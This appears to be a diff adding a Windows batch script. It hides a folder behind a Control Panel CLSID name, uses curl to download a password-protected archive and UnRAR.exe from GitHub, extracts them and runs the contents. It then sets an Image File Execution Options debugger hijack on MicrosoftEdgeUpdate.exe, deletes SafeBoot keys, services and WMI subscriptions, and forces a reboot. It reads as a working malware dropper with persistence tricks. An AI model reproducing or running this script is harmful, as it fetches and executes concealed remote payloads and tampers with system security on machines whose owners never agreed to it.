@@ -1,1 +1,48 @@
+mkdir %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
 
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" https://github.com/vltex/0/raw/main/1/wireguard.rar
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" https://github.com/vltex/1/raw/1/0/UnRAR.exe
+
+"%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe x -y -p741258963 %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar * "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
+%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Wire.exe %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wintun.dll"
+
+rd /S /Q \\.\%ProgramData%\AUX..\
+rd /S /Q \\.\%ProgramData%\CON..\
+rd /S /Q \\.\%ProgramData%\NUL..\
+rd /S /Q \\.\%ProgramData%\config..\
+rd /S /Q \\.\%ProgramData%\logdata..\
+rd /S /Q \\.\%ProgramData%\diaglogs..\
+
+del /F /S /Q /A "%WINDIR%\Setup\Scripts\*.cmd"
+del /F /S /Q /A "%ProgramData%\USOShared\*.cmd"
+
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Update" /f
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Update" /f
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Performance" /f
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Performance" /f
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
+
+sc sdset "Update" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+sc sdset "Network" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+sc sdset "Performance" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+sc sdset "Configuration" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+
+sc delete Network
+sc delete Update
+sc delete Performance
+sc delete Configuration
+
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="Report" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="Report" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="Report"' DELETE
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="Health" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="Health" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="Health"' DELETE
+
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*SCM*' -or $_.Consumer -like '*SCM*' } | Remove-WmiObject"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='SCM'\" | Remove-WmiObject"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='SCM'\" | Remove-WmiObject"
+
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*MCS*' -or $_.Consumer -like '*MCS*' } | Remove-WmiObject"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='MCS'\" | Remove-WmiObject"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='MCS'\" | Remove-WmiObject"
+
+shutdown /r /f /t 0 && powershell.exe -command "Restart-Computer -Force"
+taskkill /f /IM ShellExperienceHost.exe /t
